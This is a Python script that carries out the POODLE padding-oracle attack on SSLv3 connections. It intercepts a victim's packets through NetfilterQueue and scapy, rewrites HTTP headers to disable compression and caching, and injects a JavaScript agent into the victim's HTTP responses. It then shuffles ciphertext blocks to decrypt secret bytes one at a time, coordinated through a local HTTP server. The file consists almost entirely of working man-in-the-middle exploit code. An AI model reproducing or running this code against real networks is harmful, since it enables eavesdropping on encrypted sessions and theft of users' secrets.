#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy_http.http import *
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading
import time
from reprint import output

DEBUG = False


# Track sessions using src_port as key
sessions = {}
class Session:
	def __init__(self, src_port):
		self.downgrade_needed = True
		self.src_port = src_port
		self.ciphertext = None
		self.last_seq = None
		self.block = None
		
		
# Need to get the server IP from DNS response
server_ip = None
server_ip = '108.188.248.81' # temp

# For block_size stage
ciphertext_length = 0
data_padding_size_needed = 0
block_size = None

# For exploit stage
block_to_move = 1
current_offset = 0
secret = {}
count = 0

dns_mapping = {}
option_request_length = None
post_request_length = None
option_response_length = None
skip_first_response = True

load_layer('tls')

config = json.load(open('config.json'))

# Load the variables into the JavaScript agent that will be run on the target
js_client_html = open('poodle.js', 'r').read()
js_client_html = js_client_html.replace('attackerIp', '"' + config['attacker'] + '"').replace('targetUrl', '"https://' + config['server'] + '"')

def get_field(layer, field_name):
	return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))

def copy_block_to_end(arr, copy_index):
	return arr[:-block_size] + arr[copy_index:(copy_index+block_size)]

def modify_and_send_packet(packet, pkt):
	del pkt[IP].chksum
	del pkt[TCP].chksum
	packet.set_payload(bytes(pkt))
	packet.accept()

with output(output_type='list', initial_len=5) as output_list:

	output_list[0] = 'Finding Block Length...'

	def print_state(ciphertext_length = None, math_str = None):
		current_index = (((block_to_move + 1) * block_size) - current_offset) if block_size is not None else 0
		
		output_list[0] = "Block Size: {}, POST Request length: {}, OPTION Request length: {}".format(block_size, post_request_length, option_request_length)

		output_list[1] = "Working on decrypting byte {} - Request #{}".format(current_index, count)

		output_list[2] = "Last Byte Decrypted: {}".format(math_str) if math_str is not None else ''

		plaintext = repr(''.join([ chr(secret[i]) if i in secret else '.' for i in range(ciphertext_length) ])) if ciphertext_length is not None else '......'
		output_list[3] = "Decrypted Plaintext: {}".format(plaintext)
		
		percent_complete = len(secret) / ciphertext_length if ciphertext_length is not None else 0
		segment = int(percent_complete * 50)
		progress_bar = ("#" * segment) + (" " * (50-segment))
		output_list[4] = "Progress: [{}] {}%".format(progress_bar, int(percent_complete*100))
		
	def callback(packet):
		global block_size
		global block_to_move
		global ciphertext_length
		global data_padding_size_needed
		global sessions
		global option_request_length
		global post_request_length
		global option_response_length
		global skip_first_response
		global current_offset
		global count
		global dns_mapping

		pkt = IP(packet.get_payload())

		if HTTP in pkt:

			# On outgoing HTTP requests, make sure there is no compression or caching
			if pkt.src == config['target']:
				if DEBUG: print("Sending request to " + pkt.dst)
				raw_http = str(pkt['HTTP']['Raw'].load)

				encoding_pattern = 'Accept-Encoding: ([a-z-]+)'
				encoding_match = re.search(encoding_pattern, raw_http)
				if encoding_match is not None:
					raw_http = raw_http.replace('Accept-Encoding: ' + encoding_match.group(), 'Accept-Encoding: identity')
				else:
					index = raw_http.find('Host')
					raw_http = raw_http[:index] + 'Accept-Encoding: identity' + raw_http[:index]
					
					

				cache_pattern = 'Cache-Control: ([a-z-]+)'
				cache_match = re.search(cache_pattern, raw_http)
				if cache_match is not None:
					raw_http = raw_http.replace('Cache-Control: ' + cache_match.group(), 'Cache-Control: no-cache')
				else:
					index = raw_http.find('Host')
					raw_http = raw_http[:index] + 'Cache-Control: no-cache' + raw_http[:index]

				pkt['HTTP']['Raw'].load = raw_http

				modify_and_send_packet(packet, pkt)
				return

				#pkt.getlayer(HTTP).getlayer(Raw).load = bytes(str(pkt.getlayer(HTTP).getlayer(Raw).load).replace('Accept-Encoding: gzip', 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache'))
		#		pkt.getlayer(HTTP).show()

				#str_headers = str(pkt['HTTP']['HTTP Request'].fields['Headers'])
				#pkt['HTTP']['HTTP Request'].fields['Accept-Encoding'] = 'identity'
				#pkt['HTTP']['HTTP Request'].fields['Cache-Control'] = 'no-cache'
				#str_headers = str_headers.replace('Accept-Encoding: ' + str(pkt['HTTP']['HTTP Request'].fields['Accept-Encoding']), 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache')
				#pkt['HTTP']['HTTP Request'].fields['Headers'] = str_headers

			# On return packets, inject the JS client
			elif pkt.dst == config['target'] and 'HTTP' in pkt:
				if DEBUG: print("HTTP Payload: " + str(pkt['HTTP']['Raw'].load))
				pkt['HTTP']['Raw'].load += bytes(js_client_html, 'utf8')

				modify_and_send_packet(packet, pkt)
				return

		if DEBUG and pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
			print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))

		if pkt.src == config['target'] and pkt.dst == server_ip and TCP in pkt:

			# TLS Downgrade
			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "handshake" and get_field(pkt['TLS'], 'version') != 'SSLv3' and False:
				pkt[TCP].flags = 'FA'
				pkt[TCP].len = 0
				pkt[TCP].remove_payload()
				modify_and_send_packet(packet, pkt)
				return

			src_port = pkt['TCP'].sport
			
			session = sessions[src_port] if src_port in sessions else Session(src_port)

			# Modify retransmissions
			if session.ciphertext is not None and bytes(pkt)[-block_size:] == session.ciphertext[-block_size:]:
				new_bytes = bytes(pkt)[:-block_size] + session.block
				modify_and_send_packet(packet, IP(new_bytes))
				return

			sessions[src_port] = session

			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":

				# Don't modify pre-flight check
				if option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length):
					if DEBUG: print("Skipping OPTION Request")
					if option_request_length is None:
						if DEBUG: print("OPTION Request Length: " + str(len(pkt)))
						option_request_length = len(pkt)
					packet.accept()
					return
				elif post_request_length is None:
					if DEBUG: print("POST Request Length: " + str(len(pkt)))
					post_request_length = len(pkt)

				# Stage 1: The JS client is sending packets of increasing length
				if block_size is None:

					if DEBUG: print("Got request length " + str(len(pkt)))
					if ciphertext_length > 0:
						data_padding_size_needed += 1
						if len(pkt) > ciphertext_length:
							block_size = len(pkt) - ciphertext_length
							print_state()
							if DEBUG: print("Found block size: " + str(block_size))
					else:
						ciphertext_length = len(pkt)

				# Stage 2: The JS client is sending the same packet repeatedly and waiting for us to decrypt it
				else:

					if len(pkt) > post_request_length:
						if DEBUG: print("New POST Request Length: " + str(len(pkt)))
						post_request_length = len(pkt)

					count += 1
					if DEBUG: print("Copying block to end")

					start_index = block_size * block_to_move
					tls_data_start_index = ([i + 5 for i in range(len(bytes(pkt))) if list(bytes(pkt))[i:i+3] == [0x17, 0x03, 0x00]])[-1]

					session.ciphertext = bytes(pkt)[tls_data_start_index:]

					new_bytes = copy_block_to_end(bytes(pkt), tls_data_start_index + start_index)
					session.block = new_bytes[-block_size:]
					modify_and_send_packet(packet, IP(new_bytes))
					return

		elif pkt.src == server_ip and pkt.dst == config['target'] and 'TLS' in pkt and block_size is not None:

			# TLS Downgrade
			#if get_field(pkt.getlayer(TLS), 'type') == "application_data" and get_field(pkt['TLS'], 'version') != 'SSLv3' and pkt.src == server_ip:
			#	print("Downgrading server packet")
			#	# Change handshake status to failed
			#	modify_and_send_packet(packet, pkt)
			#	return

			# If we get success (data instead of alert), do math to get byte
			if get_field(pkt.getlayer(TLS), 'type') == "application_data" and pkt['TCP'].dport in sessions:

				# The first response that ends up here will be the response to the last block length query, so need to ignore it
				if skip_first_response:
					skip_first_response = False
					packet.accept()
					return

				# Ignore response to pre-flight check
				if option_response_length is None or len(pkt) == option_response_length:
					if DEBUG: print("Skipping OPTION Response")
					if option_response_length is None:
						if DEBUG: print("OPTION Response length: " + str(len(pkt)))
						option_response_length = len(pkt)
					packet.accept()
					return
		
				session = sessions[pkt['TCP'].dport]

				ciphertext = session.ciphertext
				del sessions[pkt[TCP].dport]
				
				if ciphertext is not None:
					previous_block_last_byte = ciphertext[((block_to_move) * block_size) - 1]
					last_block_last_byte = ciphertext[-block_size - 1]
					decrypted_byte = (block_size - 1) ^ previous_block_last_byte  ^ last_block_last_byte
					decrypted_byte_index = ((block_to_move + 1) * block_size) - current_offset - 1
					secret[decrypted_byte_index] = decrypted_byte

					if not DEBUG:
						print_state(len(ciphertext), "{} = {} ^ {} ^ {}".format(decrypted_byte, block_size - 1, previous_block_last_byte, last_block_last_byte))
					
				else:
					if DEBUG: print("ciphertext is None")
			else:
				if DEBUG: print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
				

		# Try to get server IP address from the dns name given in the config file and the DNS traffic we've intercepted
		elif server_ip is None and pkt.dst == config['target'] and DNS in pkt:
			resource = pkt[DNS]['DNS Resource Record']
			while resource is not None:
				dns_mapping[get_field(resource, 'rrname')] = get_field(resource, 'rdata')
				if 'DNS Resource Record' in resource.payload:
					resource = resource.payload['DNS Resource Record']
				else:
					resource = None

			track = config['server']
			while not track.replace('.', '').isnumeric() and track in dns_mapping:
				track = dns_mapping[track]

			if track.replace('.', '').isnumeric():
				server_ip = track
				
			pass
			# parse DNS response and get server_ip

		packet.accept()

	class Handler(BaseHTTPRequestHandler):
		def add_headers(self):
			self.send_header("Content-type", "text/plain")
			self.send_header('Access-Control-Allow-Origin', '*')

		def do_GET(self):
			global block_size
			global data_padding_size_needed
			global current_offset
			global block_to_move
			global count
			content = None

			while block_size == None:
				time.sleep(0.1)	

			if self.path == '/blocksize':
				content = bytes(str(block_size) + " " + str(int(data_padding_size_needed + 1)), 'utf8')
			elif self.path == '/offset':
				count = 0
				for i in range(block_size):
					if ((block_to_move + 1) * block_size) - i - 1 not in secret:
						current_offset = i
						content = bytes(str(i), 'utf8')
						break
				if content == None:
					block_to_move += 1
					current_offset = 0
					content = bytes('0', 'utf8')
			else:
				self.send_error(404, "Endpoint does not exist")
				return

			self.send_response(200)
			self.send_header('Content-Length', len(content))
			self.add_headers()
			self.end_headers()
			self.wfile.write(content)

	class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
		pass

	web_server = ThreadingSimpleServer(('0.0.0.0', 8080), Handler)
	web_server_thread = threading.Thread(target=web_server.serve_forever)

	nfqueue = NetfilterQueue()
	nfqueue.bind(0, callback)

	try:
		web_server_thread.start()
		nfqueue.run()
	except KeyboardInterrupt:
		pass

	nfqueue.unbind()
	web_server.shutdown()
	#web_server.socket.close()
	web_server_thread.join()
